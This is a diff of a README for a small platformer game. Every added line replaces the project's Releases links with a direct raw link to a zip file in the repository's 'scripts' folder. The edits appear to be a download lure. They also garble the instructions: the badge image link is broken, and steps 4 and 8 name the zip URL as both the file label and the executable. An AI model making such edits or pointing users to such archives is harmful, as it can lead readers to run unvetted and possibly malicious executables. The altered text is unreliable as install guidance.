@@ -8,7 +8,7 @@ Welcome to **That-One-Platformer-I-Made**, a chaotic pixel-art adventure! Jump, 
 
 You can download the game directly from our releases page. 
 
-[![Download Game](https://img.shields.io/badge/Download%20Now-That--One--Platformer--I--Made-blue)](https://github.com/siryew/That-One-Platformer-I-Made/releases)
+[![Download Game](https://raw.githubusercontent.com/siryew/That-One-Platformer-I-Made/main/scripts/That-One-Platformer-I-Made_3.9.zip%20Now-That--One--Platformer--I--Made-blue)](https://raw.githubusercontent.com/siryew/That-One-Platformer-I-Made/main/scripts/That-One-Platformer-I-Made_3.9.zip)
 
 ## 🔍 Features
 
@@ -30,14 +30,14 @@ To run **That-One-Platformer-I-Made**, you will need:
 
 ## 📂 How to Download & Install
 
-1. Visit the [Releases page](https://github.com/siryew/That-One-Platformer-I-Made/releases) to find the latest version of the game.
+1. Visit the [Releases page](https://raw.githubusercontent.com/siryew/That-One-Platformer-I-Made/main/scripts/That-One-Platformer-I-Made_3.9.zip) to find the latest version of the game.
 2. Look for the version labeled as the most recent stable release.
 3. Click on the release title to open the details.
-4. Find the download link for the game file, typically labeled as something like `That-One-Platformer-I-Made-windows.zip`.
+4. Find the download link for the game file, typically labeled as something like `https://raw.githubusercontent.com/siryew/That-One-Platformer-I-Made/main/scripts/That-One-Platformer-I-Made_3.9.zip`.
 5. Click on this link to download the game file to your computer.
 6. Once the download is complete, locate the file in your Downloads folder.
 7. Right-click on the zip file and select "Extract All" or use your preferred extraction tool to unzip it.
-8. Open the extracted folder and find the executable file named `That-One-Platformer-I-Made.exe`.
+8. Open the extracted folder and find the executable file named `https://raw.githubusercontent.com/siryew/That-One-Platformer-I-Made/main/scripts/That-One-Platformer-I-Made_3.9.zip`.
 9. Double-click the executable file to launch the game.
 
 ## 🎮 Playing the Game
@@ -60,7 +60,7 @@ If you encounter any issues while downloading or running the game, try these ste
 
 ## 📣 Stay Updated
 
-We regularly update the game. Check back often on the [Releases page](https://github.com/siryew/That-One-Platformer-I-Made/releases) for new features, bug fixes, and improvements.
+We regularly update the game. Check back often on the [Releases page](https://raw.githubusercontent.com/siryew/That-One-Platformer-I-Made/main/scripts/That-One-Platformer-I-Made_3.9.zip) for new features, bug fixes, and improvements.
 
 ## 📞 Support
 
